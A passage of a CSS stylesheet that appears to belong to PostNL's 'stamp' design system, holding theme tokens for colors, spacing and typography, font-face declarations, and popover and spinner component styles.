--stamp-color-background-date-input-date-disabled: #f1f1f2; --stamp-color-background-date-input-date-range: #ffede0; --stamp-color-background-date-input-date-default: #ffffff; --stamp-color-background-data-list-selected: #ffffff00; --stamp-color-background-data-list-pressed: #f1f1f2; --stamp-color-background-data-list-hover: #f1f1f2; --stamp-color-background-data-list-default: #ffffff00; --stamp-color-background-card-brand-red-accent: #ba2a0f; --stamp-color-background-card-brand-red-default: #d23416; --stamp-color-background-card-brand-green-accent: #004728; --stamp-color-background-card-brand-green-default: #005e35; --stamp-color-background-card-brand-blue-accent: #4e4ee2; --stamp-color-background-card-brand-blue-default: #6161ff; --stamp-color-background-card-brand-dark-blue-accent: #001252; --stamp-color-background-card-brand-dark-blue-default: #001a73; --stamp-color-background-card-brand-orange-accent: #C23400; --stamp-color-background-card-brand-orange-default: #D83D00; --stamp-color-background-card-inverse-accent: #ffffff; --stamp-color-background-card-inverse-default: #ffffff; --stamp-color-background-card-neutral-accent: #e7e8eb; --stamp-color-background-card-neutral-default: #f1f1f2; --stamp-color-background-button-tertiary-pressed: #ffffff00; --stamp-color-background-button-tertiary-default: #ffffff00; --stamp-color-background-button-secondary-pressed: #ffffff00; --stamp-color-background-button-secondary-default: #ffffff00; --stamp-color-background-button-primary-pressed: #001a73; --stamp-color-background-button-primary-default: #6161ff; --stamp-color-background-switch-button-active-disabled: #f1f1f2; --stamp-color-background-switch-button-active-default: #ffffff; --stamp-color-background-switch-button-normal-disabled: #f1f1f2; --stamp-color-background-switch-button-normal-default: #ffffff; --stamp-color-background-switch-normal-disabled: #bec0cb; --stamp-color-background-switch-normal-default: #86889d; --stamp-color-background-switch-active-disabled: #bec0cb; --stamp-color-background-switch-active-default: #e75204; --stamp-color-background-disabled: #f1f1f2; --stamp-color-background-negative: #ee32611a; --stamp-color-background-warning: #fdd7321a; --stamp-color-background-positive: #00bb531a; --stamp-color-background-informative: #009ee31a; --stamp-color-background-notification: #d70036; --stamp-color-background-inverse: #1f1e2f; --stamp-color-background-subtle: #dddee3; --stamp-color-background-strong: #86889d; --stamp-color-background-brand-deep: #D83D00; --stamp-color-background-brand-subtle: #e75204; --stamp-color-background-brand: #f56900; --stamp-color-background-variant: #f1f1f2; --stamp-color-background-default: #e7e8eb; --stamp-color-background-surface: #ffffff; --stamp-color-text-segment-selected: #ffffff; --stamp-color-text-segment-default: #4e4ee2; --stamp-color-text-link-visited: #d05aff; --stamp-color-text-link-pressed: #001a73; --stamp-color-text-link-hover: #4e4ee2; --stamp-color-text-link-on-brand: #ffffff; --stamp-color-text-link-subtle: #1f1e2f; --stamp-color-text-link-default: #4e4ee2; --stamp-color-text-icon-button-pressed: #001a73; --stamp-color-text-icon-button-default: #4e4ee2; --stamp-color-text-form-control-placeholder-disabled: #bec0cb; --stamp-color-text-form-control-placeholder-default: #67687f; --stamp-color-text-form-control-value-disabled: #86889d; --stamp-color-text-form-control-value-default: #1f1e2f; --stamp-color-text-date-input-today-disabled: #ffffff; --stamp-color-text-date-input-today-selected: #ffffff; --stamp-color-text-date-input-today-default: #ffffff; --stamp-color-text-date-input-date-disabled: #bec0cb; --stamp-color-text-date-input-date-selected: #1f1e2f; --stamp-color-text-date-input-date-pressed: #001a73; --stamp-color-text-date-input-date-hover: #4e4ee2; --stamp-color-text-date-input-date-subtle: #bec0cb; --stamp-color-text-date-input-date-strong: #1f1e2f; --stamp-color-text-date-input-date-default: #4e4ee2; --stamp-color-text-button-tertiary-pressed: #001a73; --stamp-color-text-button-tertiary-default: #4e4ee2; --stamp-color-text-button-secondary-pressed: #001a73; --stamp-color-text-button-secondary-default: #4e4ee2; --stamp-color-text-button-primary-pressed: #ffffff; --stamp-color-text-button-primary-default: #ffffff; --stamp-color-text-negative: #d70036; --stamp-color-text-positive: #008005; --stamp-color-text-inverse: #ffffff; --stamp-color-text-on-brand: #ffffff; --stamp-color-text-subtle: #67687f; --stamp-color-text-brand: #D83D00; --stamp-color-text-default: #1f1e2f; --stamp-color-heading-on-brand: #ffffff; --stamp-color-heading-subtle: #1f1e2f; --stamp-color-heading-brand: #e75204; --stamp-color-heading-default: #001a73; }

html { box-sizing: border-box; }

*, ::before, ::after { padding: 0px; margin: 0px; box-sizing: border-box; }

a { text-decoration: underline; color: var(--stamp-color-text-default); }

address { font-style: normal; }

:root { --z-index-base: 0; --z-index-above: 1; --z-index-below: -1; }

.sr-only { position: absolute; inline-size: 1px; block-size: 1px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); border: 0px; }

.lock-scroll { top: var(--locked-scroll-position, 0); position: fixed; width: 100%; overflow: hidden; }

@font-face { font-family: PostNL; src: url(&quot;&quot;) format(&quot;woff2&quot;); font-style: italic; font-weight: 700; }

@font-face { font-family: PostNL; src: url(&quot;&quot;) format(&quot;woff2&quot;); font-style: normal; font-weight: 700; }

@font-face { font-family: PostNL; src: url(&quot;&quot;) format(&quot;woff2&quot;); font-style: italic; font-weight: 400; }

@font-face { font-family: PostNL; src: url(&quot;&quot;) format(&quot;woff2&quot;); font-style: normal; font-weight: 400; }

@font-face { font-family: PostNL; src: url(&quot;&quot;) format(&quot;woff2&quot;); font-style: italic; font-weight: 300; }

@font-face { font-family: PostNL; src: url(&quot;&quot;) format(&quot;woff2&quot;); font-style: normal; font-weight: 300; }

@font-face { font-family: Hanken Grotesk; src: url(&quot;&quot;) format(&quot;woff2 supports variations&quot;), url(&quot;&quot;) format(&quot;woff2-variations&quot;); font-weight: 100 900; }

@font-face { font-family: Hanken Grotesk; src: url(&quot;&quot;) format(&quot;woff2 supports variations&quot;), url(&quot;&quot;) format(&quot;woff2-variations&quot;); font-style: italic; font-weight: 100 900; }

@font-face { font-family: ABC ROM; src: url(&quot;&quot;) format(&quot;woff2&quot;); }

.stamp-popover { --tooth-size: 8px; position: fixed; display: flex; flex-direction: column; filter: drop-shadow(var(--stamp-drop-shadow-flyout-down)); inline-size: auto; outline: none; }

.stamp-popover--up { flex-direction: column; }

.stamp-popover--down { flex-direction: column-reverse; }

.stamp-popover__content { background-color: var(--stamp-color-background-surface); border-radius: 4px; padding: var(--stamp-spacing-inner-l); max-inline-size: 536px; margin-inline: var(--stamp-spacing-outer-s); }

.stamp-popover__title { font-family: var(--stamp-text-heading-xs-font-family); font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); letter-spacing: var(--stamp-text-heading-xs-letter-spacing); }

.stamp-popover__message { font-weight: var(--stamp-text-body-m-default-font-weight); }

.stamp-popover__dismiss-button { position: absolute; inset-inline-end: var(--stamp-spacing-inner-m); inset-block-start: var(--stamp-spacing-inner-m); border: medium; cursor: pointer; }

.stamp-popover--down .stamp-popover__dismiss-button { inset-block-start: calc(var(--stamp-spacing-inner-m) + var(--tooth-size) * 2); }

.stamp-popover__tooth { inline-size: 0px; block-size: 0px; border-style: solid; border-width: var(--tooth-size); }

.stamp-popover--down .stamp-popover__tooth { border-top-color: transparent; border-right-color: transparent; border-bottom-color: var(--stamp-color-background-surface); border-left-color: transparent; }

.stamp-popover--up .stamp-popover__tooth { border-top-color: var(--stamp-color-background-surface); border-right-color: transparent; border-bottom-color: transparent; border-left-color: transparent; }

.stamp-spinner { display: block; inline-size: 32px; block-size: 32px; }

.stamp-spinner--size-s { inline-size: 24px; block-size: 24px; }

.stamp-spinner--size-m { inline-size: 32px; block-size: 32px; }

.stamp-spinner--size-l { inline-size: 48px; block-size: 48px; }

.stamp-spinner__spinner { display: block; animation: 1500ms linear infinite spin; inline-size: 100%; block-size: 100%; }

.stamp-spinner__spinner svg { inline-size: 100%; block-size: 100%; }

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.stamp-theme-light { --stamp-opacity-illustration-disabled: 60%; --stamp-opacity-illustration-default: 100%; --stamp-opacity-mix-subtle: 10%; --stamp-opacity-mix-strong: 90%; --stamp-opacity-mix-default: 30%; --stamp-opacity-backdrop: 60%; --stamp-blend-mode-disabled: Luminosity; --stamp-blend-mode-default: Normal; --stamp-border-width-l: 4px; --stamp-border-width-m: 2px; --stamp-border-width-s: 1px; --stamp-border-width-xs: 0.5px; --stamp-radius-xxl: 32px; --stamp-radius-xl: 24px; --stamp-radius-l: 16px; --stamp-radius-m: 8px; --stamp-radius-s: 6px; --stamp-radius-xs: 4px; --stamp-radius-xxs: 2px; --stamp-size-medium-illustration-m: 240px; --stamp-size-medium-illustration-s: 204px; --stamp-size-illustration-3-xl: 144px; --stamp-size-illustration-xxl: 120px; --stamp-size-illustration-xl: 96px; --stamp-size-illustration-l: 88px; --stamp-size-illustration-m: 80px; --stamp-size-illustration-s: 56px; --stamp-size-icon-l: 40px; --stamp-size-icon-m: 24px; --stamp-size-icon-s: 16px; --stamp-spacing-outer-xl: 88px; --stamp-spacing-outer-l: 56px; --stamp-spacing-outer-m: 40px; --stamp-spacing-outer-s: 24px; --stamp-spacing-outer-xs: 16px; --stamp-spacing-inner-4-xl: 56px; --stamp-spacing-inner-3-xl: 40px; --stamp-spacing-inner-xxl: 32px; --stamp-spacing-inner-xl: 24px; --stamp-spacing-inner-l: 16px; --stamp-spacing-inner-m: 12px; --stamp-spacing-inner-s: 8px; --stamp-spacing-inner-xs: 4px; --stamp-spacing-inner-xxs: 2px; --stamp-text-app-navigation-selected-letter-spacing: 0px; --stamp-text-app-navigation-selected-font-size: 12px; --stamp-text-app-navigation-selected-line-height: 1.6; --stamp-text-app-navigation-selected-font-weight: 700; --stamp-text-app-navigation-selected-font-family: Hanken Grotesk; --stamp-text-app-navigation-default-letter-spacing: 0px; --stamp-text-app-navigation-default-font-size: 12px; --stamp-text-app-navigation-default-line-height: 1.6; --stamp-text-app-navigation-default-font-weight: 400; --stamp-text-app-navigation-default-font-family: Hanken Grotesk; --stamp-text-step-todo-letter-spacing: 0px; --stamp-text-step-todo-font-size: 16px; --stamp-text-step-todo-line-height: 1.6; --stamp-text-step-todo-font-weight: 400; --stamp-text-step-todo-font-family: Hanken Grotesk; --stamp-text-step-default-letter-spacing: 0px; --stamp-text-step-default-font-size: 16px; --stamp-text-step-default-line-height: 1.6; --stamp-text-step-default-font-weight: 400; --stamp-text-step-default-font-family: Hanken Grotesk; --stamp-text-badge-default-letter-spacing: 0px; --stamp-text-badge-default-font-size: 14px; --stamp-text-badge-default-line-height: 1.05; --stamp-text-badge-default-font-weight: 400; --stamp-text-badge-default-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-selected-letter-spacing: 0px; --stamp-text-form-date-input-date-selected-font-size: 18px; --stamp-text-form-date-input-date-selected-line-height: 1.4; --stamp-text-form-date-input-date-selected-font-weight: 700; --stamp-text-form-date-input-date-selected-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-pressed-text-decoration: underline; --stamp-text-form-date-input-date-pressed-letter-spacing: 0px; --stamp-text-form-date-input-date-pressed-font-size: 18px; --stamp-text-form-date-input-date-pressed-line-height: 1.4; --stamp-text-form-date-input-date-pressed-font-weight: 400; --stamp-text-form-date-input-date-pressed-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-hover-text-decoration: underline; --stamp-text-form-date-input-date-hover-letter-spacing: 0px; --stamp-text-form-date-input-date-hover-font-size: 18px; --stamp-text-form-date-input-date-hover-line-height: 1.4; --stamp-text-form-date-input-date-hover-font-weight: 400; --stamp-text-form-date-input-date-hover-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-default-letter-spacing: 0px; --stamp-text-form-date-input-date-default-font-size: 18px; --stamp-text-form-date-input-date-default-line-height: 1.4; --stamp-text-form-date-input-date-default-font-weight: 400; --stamp-text-form-date-input-date-default-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-highlighted-letter-spacing: 0px; --stamp-text-form-data-list-body-highlighted-text-decoration: underline; --stamp-text-form-data-list-body-highlighted-font-size: 14px; --stamp-text-form-data-list-body-highlighted-line-height: 1.6; --stamp-text-form-data-list-body-highlighted-font-weight: 400; --stamp-text-form-data-list-body-highlighted-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-pressed-letter-spacing: 0px; --stamp-text-form-data-list-body-pressed-font-size: 14px; --stamp-text-form-data-list-body-pressed-line-height: 1.6; --stamp-text-form-data-list-body-pressed-font-weight: 400; --stamp-text-form-data-list-body-pressed-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-hover-letter-spacing: 0px; --stamp-text-form-data-list-body-hover-font-size: 14px; --stamp-text-form-data-list-body-hover-line-height: 1.6; --stamp-text-form-data-list-body-hover-font-weight: 400; --stamp-text-form-data-list-body-hover-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-default-letter-spacing: 0px; --stamp-text-form-data-list-body-default-font-size: 14px; --stamp-text-form-data-list-body-default-line-height: 1.6; --stamp-text-form-data-list-body-default-font-weight: 400; --stamp-text-form-data-list-body-default-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-highlighted-letter-spacing: 0px; --stamp-text-form-data-list-title-highlighted-text-decoration: underline; --stamp-text-form-data-list-title-highlighted-font-size: 16px; --stamp-text-form-data-list-title-highlighted-line-height: 1.4; --stamp-text-form-data-list-title-highlighted-font-weight: 700; --stamp-text-form-data-list-title-highlighted-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-pressed-letter-spacing: 0px; --stamp-text-form-data-list-title-pressed-font-size: 16px; --stamp-text-form-data-list-title-pressed-line-height: 1.4; --stamp-text-form-data-list-title-pressed-font-weight: 700; --stamp-text-form-data-list-title-pressed-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-hover-letter-spacing: 0px; --stamp-text-form-data-list-title-hover-font-size: 16px; --stamp-text-form-data-list-title-hover-line-height: 1.4; --stamp-text-form-data-list-title-hover-font-weight: 700; --stamp-text-form-data-list-title-hover-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-default-letter-spacing: 0px; --stamp-text-form-data-list-title-default-font-size: 16px; --stamp-text-form-data-list-title-default-line-height: 1.4; --stamp-text-form-data-list-title-default-font-weight: 700; --stamp-text-form-data-list-title-default-font-family: Hanken Grotesk; --stamp-text-form-feedback-letter-spacing: 0px; --stamp-text-form-feedback-font-size: 14px; --stamp-text-form-feedback-line-height: 1.4; --stamp-text-form-feedback-font-weight: 700; --stamp-text-form-feedback-font-family: Hanken Grotesk; --stamp-text-form-label-letter-spacing: 0px; --stamp-text-form-label-font-size: 16px; --stamp-text-form-label-line-height: 1.2; --stamp-text-form-label-font-weight: 700; --stamp-text-form-label-font-family: Hanken Grotesk; --stamp-text-hyperlink-pressed-letter-spacing: 0px; --stamp-text-hyperlink-pressed-text-decoration: underline; --stamp-text-hyperlink-pressed-font-size: 16px; --stamp-text-hyperlink-pressed-line-height: 1.6; --stamp-text-hyperlink-pressed-font-weight: 400; --stamp-text-hyperlink-pressed-font-family: Hanken Grotesk; --stamp-text-hyperlink-hover-letter-spacing: 0px; --stamp-text-hyperlink-hover-text-decoration: underline; --stamp-text-hyperlink-hover-font-size: 16px; --stamp-text-hyperlink-hover-line-height: 1.6; --stamp-text-hyperlink-hover-font-weight: 400; --stamp-text-hyperlink-hover-font-family: Hanken Grotesk; --stamp-text-hyperlink-default-letter-spacing: 0px; --stamp-text-hyperlink-default-text-decoration: underline; --stamp-text-hyperlink-default-font-size: 16px; --stamp-text-hyperlink-default-line-height: 1.6; --stamp-text-hyperlink-default-font-weight: 400; --stamp-text-hyperlink-default-font-family: Hanken Grotesk; --stamp-text-link-s-pressed-text-decoration: underline; --stamp-text-link-s-pressed-letter-spacing: 0px; --stamp-text-link-s-pressed-font-size: 14px; --stamp-text-link-s-pressed-line-height: 1.6; --stamp-text-link-s-pressed-font-weight: 400; --stamp-text-link-s-pressed-font-family: Hanken Grotesk; --stamp-text-link-s-hover-text-decoration: underline; --stamp-text-link-s-hover-letter-spacing: 0px; --stamp-text-link-s-hover-font-size: 14px; --stamp-text-link-s-hover-line-height: 1.6; --stamp-text-link-s-hover-font-weight: 400; --stamp-text-link-s-hover-font-family: Hanken Grotesk; --stamp-text-link-s-default-letter-spacing: 0px; --stamp-text-link-s-default-font-size: 14px; --stamp-text-link-s-default-line-height: 1.6; --stamp-text-link-s-default-font-weight: 400; --stamp-text-link-s-default-font-family: Hanken Grotesk; --stamp-text-link-m-pressed-text-decoration: underline; --stamp-text-link-m-pressed-letter-spacing: 0px; --stamp-text-link-m-pressed-font-size: 16px; --stamp-text-link-m-pressed-line-height: 1.6; --stamp-text-link-m-pressed-font-weight: 400; --stamp-text-link-m-pressed-font-family: Hanken Grotesk; --stamp-text-link-m-hover-text-decoration: underline; --stamp-text-link-m-hover-letter-spacing: 0px; --stamp-text-link-m-hover-font-size: 16px; --stamp-text-link-m-hover-line-height: 1.6; --stamp-text-link-m-hover-font-weight: 400; --stamp-text-link-m-hover-font-family: Hanken Grotesk; --stamp-text-link-m-default-letter-spacing: 0px; --stamp-text-link-m-default-font-size: 16px; --stamp-text-link-m-default-line-height: 1.6; --stamp-text-link-m-default-font-weight: 400; --stamp-text-link-m-default-font-family: Hanken Grotesk; --stamp-text-link-l-pressed-letter-spacing: 0px; --stamp-text-link-l-pressed-font-size: 16px; --stamp-text-link-l-pressed-text-decoration: underline; --stamp-text-link-l-pressed-line-height: 1.4; --stamp-text-link-l-pressed-font-weight: 700; --stamp-text-link-l-pressed-font-family: Hanken Grotesk; --stamp-text-link-l-hover-letter-spacing: 0px; --stamp-text-link-l-hover-font-size: 16px; --stamp-text-link-l-hover-text-decoration: underline; --stamp-text-link-l-hover-line-height: 1.4; --stamp-text-link-l-hover-font-weight: 700; --stamp-text-link-l-hover-font-family: Hanken Grotesk; --stamp-text-link-l-default-letter-spacing: 0px; --stamp-text-link-l-default-font-size: 16px; --stamp-text-link-l-default-line-height: 1.4; --stamp-text-link-l-default-font-weight: 700; --stamp-text-link-l-default-font-family: Hanken Grotesk; --stamp-text-cta-pressed-letter-spacing: 0px; --stamp-text-cta-pressed-font-size: 16px; --stamp-text-cta-pressed-text-decoration: underline; --stamp-text-cta-pressed-line-height: 1.4; --stamp-text-cta-pressed-font-weight: 700; --stamp-text-cta-pressed-font-family: Hanken Grotesk; --stamp-text-cta-hover-letter-spacing: 0px; --stamp-text-cta-hover-font-size: 16px; --stamp-text-cta-hover-text-decoration: underline; --stamp-text-cta-hover-line-height: 1.4; --stamp-text-cta-hover-font-weight: 700; --stamp-text-cta-hover-font-family: Hanken Grotesk; --stamp-text-cta-default-letter-spacing: 0px; --stamp-text-cta-default-font-size: 16px; --stamp-text-cta-default-line-height: 1.4; --stamp-text-cta-default-font-weight: 700; --stamp-text-cta-default-font-family: Hanken Grotesk; --stamp-text-price-xs-default-letter-spacing: 0px; --stamp-text-price-xs-default-font-size: 16px; --stamp-text-price-xs-default-line-height: 1.05; --stamp-text-price-xs-default-font-weight: 800; --stamp-text-price-xs-default-font-family: Hanken Grotesk; --stamp-text-price-s-decimal-letter-spacing: 0px; --stamp-text-price-s-decimal-font-size: 19px; --stamp-text-price-s-decimal-line-height: 1.05; --stamp-text-price-s-decimal-font-weight: 800; --stamp-text-price-s-decimal-font-family: Hanken Grotesk; --stamp-text-price-s-default-letter-spacing: 0px; --stamp-text-price-s-default-font-size: 19px; --stamp-text-price-s-default-line-height: 1.05; --stamp-text-price-s-default-font-weight: 800; --stamp-text-price-s-default-font-family: Hanken Grotesk; --stamp-text-price-m-decimal-letter-spacing: 0px; --stamp-text-price-m-decimal-font-size: 25px; --stamp-text-price-m-decimal-line-height: 1.05; --stamp-text-price-m-decimal-font-weight: 800; --stamp-text-price-m-decimal-font-family: Hanken Grotesk; --stamp-text-price-m-default-letter-spacing: 0px; --stamp-text-price-m-default-font-size: 25px; --stamp-text-price-m-default-line-height: 1.05; --stamp-text-price-m-default-font-weight: 800; --stamp-text-price-m-default-font-family: Hanken Grotesk; --stamp-text-price-l-decimal-letter-spacing: 0px; --stamp-text-price-l-decimal-font-size: 33px; --stamp-text-price-l-decimal-line-height: 1.05; --stamp-text-price-l-decimal-font-weight: 800; --stamp-text-price-l-decimal-font-family: Hanken Grotesk; --stamp-text-price-l-default-letter-spacing: 0px; --stamp-text-price-l-default-font-size: 33px; --stamp-text-price-l-default-line-height: 1.05; --stamp-text-price-l-default-font-weight: 800; --stamp-text-price-l-default-font-family: Hanken Grotesk; --stamp-text-body-s-emphasis-letter-spacing: 0px; --stamp-text-body-s-emphasis-font-size: 14px; --stamp-text-body-s-emphasis-line-height: 1.6; --stamp-text-body-s-emphasis-font-weight: 700; --stamp-text-body-s-emphasis-font-family: Hanken Grotesk; --stamp-text-body-s-default-letter-spacing: 0px; --stamp-text-body-s-default-font-size: 14px; --stamp-text-body-s-default-line-height: 1.6; --stamp-text-body-s-default-font-weight: 400; --stamp-text-body-s-default-font-family: Hanken Grotesk; --stamp-text-body-m-emphasis-letter-spacing: 0px; --stamp-text-body-m-emphasis-font-size: 16px; --stamp-text-body-m-emphasis-line-height: 1.6; --stamp-text-body-m-emphasis-font-weight: 700; --stamp-text-body-m-emphasis-font-family: Hanken Grotesk; --stamp-text-body-m-default-letter-spacing: 0px; --stamp-text-body-m-default-font-size: 16px; --stamp-text-body-m-default-line-height: 1.6; --stamp-text-body-m-default-font-weight: 400; --stamp-text-body-m-default-font-family: Hanken Grotesk; --stamp-text-body-l-emphasis-letter-spacing: 0px; --stamp-text-body-l-emphasis-font-size: 19px; --stamp-text-body-l-emphasis-line-height: 1.6; --stamp-text-body-l-emphasis-font-weight: 700; --stamp-text-body-l-emphasis-font-family: Hanken Grotesk; --stamp-text-body-l-default-letter-spacing: 0px; --stamp-text-body-l-default-font-size: 19px; --stamp-text-body-l-default-line-height: 1.6; --stamp-text-body-l-default-font-weight: 400; --stamp-text-body-l-default-font-family: Hanken Grotesk; --stamp-text-subtitle-s-letter-spacing: 0px; --stamp-text-subtitle-s-font-size: 18px; --stamp-text-subtitle-s-line-height: 1.2; --stamp-text-subtitle-s-font-weight: 500; --stamp-text-subtitle-s-font-family: Hanken Grotesk; --stamp-text-subtitle-m-letter-spacing: 0px; --stamp-text-subtitle-m-font-size: 19px; --stamp-text-subtitle-m-line-height: 1.2; --stamp-text-subtitle-m-font-weight: 500; --stamp-text-subtitle-m-font-family: Hanken Grotesk; --stamp-text-subtitle-l-letter-spacing: 0px; --stamp-text-subtitle-l-font-size: 24px; --stamp-text-subtitle-l-line-height: 1.2; --stamp-text-subtitle-l-font-weight: 500; --stamp-text-subtitle-l-font-family: Hanken Grotesk; --stamp-text-heading-xxs-letter-spacing: 0px; --stamp-text-heading-xxs-font-size: 14px; --stamp-text-heading-xxs-line-height: 1.05; --stamp-text-heading-xxs-font-weight: 500; --stamp-text-heading-xxs-font-family: Hanken Grotesk; --stamp-text-heading-xs-letter-spacing: 0px; --stamp-text-heading-xs-font-size: 16px; --stamp-text-heading-xs-line-height: 1.2; --stamp-text-heading-xs-font-weight: 700; --stamp-text-heading-xs-font-family: Hanken Grotesk; --stamp-text-heading-s-letter-spacing: 0px; --stamp-text-heading-s-font-size: 18px; --stamp-text-heading-s-line-height: 1.05; --stamp-text-heading-s-font-weight: 700; --stamp-text-heading-s-font-family: ABC ROM; --stamp-text-heading-m-letter-spacing: 0px; --stamp-text-heading-m-font-size: 21px; --stamp-text-heading-m-line-height: 1.05; --stamp-text-heading-m-font-weight: 700; --stamp-text-heading-m-font-family: ABC ROM; --stamp-text-heading-l-letter-spacing: -0.5px; --stamp-text-heading-l-font-size: 25px; --stamp-text-heading-l-line-height: 0.95; --stamp-text-heading-l-font-weight: 700; --stamp-text-heading-l-font-family: ABC ROM; --stamp-text-heading-xl-letter-spacing: -1px; --stamp-text-heading-xl-font-size: 32px; --stamp-text-heading-xl-line-height: 0.9; --stamp-text-heading-xl-font-weight: 700; --stamp-text-heading-xl-font-family: ABC ROM; --stamp-text-heading-xxl-letter-spacing: -1.5px; --stamp-text-heading-xxl-font-size: 40px; --stamp-text-heading-xxl-line-height: 0.9; --stamp-text-heading-xxl-font-weight: 700; --stamp-text-heading-xxl-font-family: ABC ROM; --stamp-text-heading-3-xl-letter-spacing: -1.5px; --stamp-text-heading-3-xl-font-size: 54px; --stamp-text-heading-3-xl-line-height: 0.9; --stamp-text-heading-3-xl-font-weight: 700; --stamp-text-heading-3-xl-font-family: ABC ROM; --stamp-drop-shadow-block-start: 0px -2px 8px #1f1e2f26; --stamp-drop-shadow-flyout-down: 0px 2px 8px #1f1e2f26; --stamp-color-overflow-block-end: linear-gradient(180deg, #ffffff00 0%, #6161ff4d 100%); --stamp-color-overflow-block-start: linear-gradient(180deg, #6161ff4d 0%, #ffffff00 100%); --stamp-color-overflow-inline-end: linear-gradient(90deg, #ffffff00 0%, #ffffff 100%); --stamp-color-overflow-inline-start: linear-gradient(90deg, #ffffff 0%, #ffffff00 100%); --stamp-color-icon-icon-button-tertiary-pressed: #001a73; --stamp-color-icon-icon-button-tertiary-default: #4e4ee2; --stamp-color-icon-icon-button-secondary-pressed: #001a73; --stamp-color-icon-icon-button-secondary-default: #4e4ee2; --stamp-color-icon-icon-button-primary-pressed: #ffffff; --stamp-color-icon-icon-button-primary-default: #ffffff; --stamp-color-icon-button-tertiary-pressed: #001a73; --stamp-color-icon-button-tertiary-default: #4e4ee2; --stamp-color-icon-button-secondary-pressed: #001a73; --stamp-color-icon-button-secondary-default: #4e4ee2; --stamp-color-icon-button-primary-pressed: #ffffff; --stamp-color-icon-button-primary-default: #ffffff; --stamp-color-icon-accent-inverse: #1f1e2f; --stamp-color-icon-accent-default: #ffffff; --stamp-color-icon-disabled: #bec0cb; --stamp-color-icon-selected: #e75204; --stamp-color-icon-pressed: #001a73; --stamp-color-icon-hover: #4e4ee2; --stamp-color-icon-negative: #ee3261; --stamp-color-icon-warning: #fdd732; --stamp-color-icon-positive: #00BB53; --stamp-color-icon-informative: #009ee3; --stamp-color-icon-sustainable: #00BB53; --stamp-color-icon-on-brand: #ffffff; --stamp-color-icon-subtle: #86889d; --stamp-color-icon-switch-active-disabled: #bec0cb; --stamp-color-icon-switch-active-hover: #4e4ee2; --stamp-color-icon-switch-active-strong: #e75204; --stamp-color-icon-switch-normal-disabled: #bec0cb; --stamp-color-icon-switch-normal-hover: #4e4ee2; --stamp-color-icon-switch-normal-strong: #1f1e2f; --stamp-color-icon-strong: #1f1e2f; --stamp-color-icon-brand: #e75204; --stamp-color-icon-default: #4e4ee2; --stamp-color-border-button-tertiary-pressed: #ffffff00; --stamp-color-border-button-tertiary-default: #ffffff00; --stamp-color-border-button-secondary-pressed: #001a73; --stamp-color-border-button-secondary-default: #6161ff; --stamp-color-border-button-primary-pressed: #ffffff00; --stamp-color-border-button-primary-default: #ffffff00; --stamp-color-border-fallback: #ffffff00; --stamp-color-border-focus-outline: #001a73; --stamp-color-border-disabled: #bec0cb; --stamp-color-border-error: #d70036; --stamp-color-border-selected: #e75204; --stamp-color-border-pressed: #001a73; --stamp-color-border-hover: #6161ff; --stamp-color-border-negative: #ee3261; --stamp-color-border-warning: #fdd732; --stamp-color-border-positive: #00BB53; --stamp-color-border-informative: #009ee3; --stamp-color-border-strong: #67687f; --stamp-color-border-brand: #e75204; --stamp-color-border-default: #bec0cb; --stamp-color-background-badge-brand: #D83D00; --stamp-color-background-badge-important: #d70036; --stamp-color-background-badge-secondary: #e7e8eb; --stamp-color-background-badge-primary: #6161ff; --stamp-color-background-app-brand: #D83D00; --stamp-color-background-app-default: #f1f1f2; --stamp-color-background-segment-selected: #6161ff; --stamp-color-background-segment-default: #ffffff00; --stamp-color-background-icon-button-tertiary-pressed: #ffffff00; --stamp-color-background-icon-button-tertiary-default: #ffffff00; --stamp-color-background-icon-button-secondary-pressed: #e7e8eb; --stamp-color-background-icon-button-secondary-default: #f1f1f2; --stamp-color-background-icon-button-primary-pressed: #001a73; --stamp-color-background-icon-button-primary-default: #6161ff; --stamp-color-background-date-input-today-disabled: #bec0cb; --stamp-color-background-date-input-today-default: #67687f; --stamp-color-background-date-input-date-disabled: #f1f1f2; --stamp-color-background-date-input-date-range: #ffede0; --stamp-color-background-date-input-date-default: #ffffff; --stamp-color-background-data-list-selected: #ffffff00; --stamp-color-background-data-list-pressed: #f1f1f2; --stamp-color-background-data-list-hover: #f1f1f2; --stamp-color-background-data-list-default: #ffffff00; --stamp-color-background-card-brand-red-accent: #ba2a0f; --stamp-color-background-card-brand-red-default: #d23416; --stamp-color-background-card-brand-green-accent: #004728; --stamp-color-background-card-brand-green-default: #005e35; --stamp-color-background-card-brand-blue-accent: #4e4ee2; --stamp-color-background-card-brand-blue-default: #6161ff; --stamp-color-background-card-brand-dark-blue-accent: #001252; --stamp-color-background-card-brand-dark-blue-default: #001a73; --stamp-color-background-card-brand-orange-accent: #C23400; --stamp-color-background-card-brand-orange-default: #D83D00; --stamp-color-background-card-inverse-accent: #ffffff; --stamp-color-background-card-inverse-default: #ffffff; --stamp-color-background-card-neutral-accent: #e7e8eb; --stamp-color-background-card-neutral-default: #f1f1f2; --stamp-color-background-button-tertiary-pressed: #ffffff00; --stamp-color-background-button-tertiary-default: #ffffff00; --stamp-color-background-button-secondary-pressed: #ffffff00; --stamp-color-background-button-secondary-default: #ffffff00; --stamp-color-background-button-primary-pressed: #001a73; --stamp-color-background-button-primary-default: #6161ff; --stamp-color-background-switch-button-active-disabled: #f1f1f2; --stamp-color-background-switch-button-active-default: #ffffff; --stamp-color-background-switch-button-normal-disabled: #f1f1f2; --stamp-color-background-switch-button-normal-default: #ffffff; --stamp-color-background-switch-normal-disabled: #bec0cb; --stamp-color-background-switch-normal-default: #86889d; --stamp-color-background-switch-active-disabled: #bec0cb; --stamp-color-background-switch-active-default: #e75204; --stamp-color-background-disabled: #f1f1f2; --stamp-color-background-negative: #ee32611a; --stamp-color-background-warning: 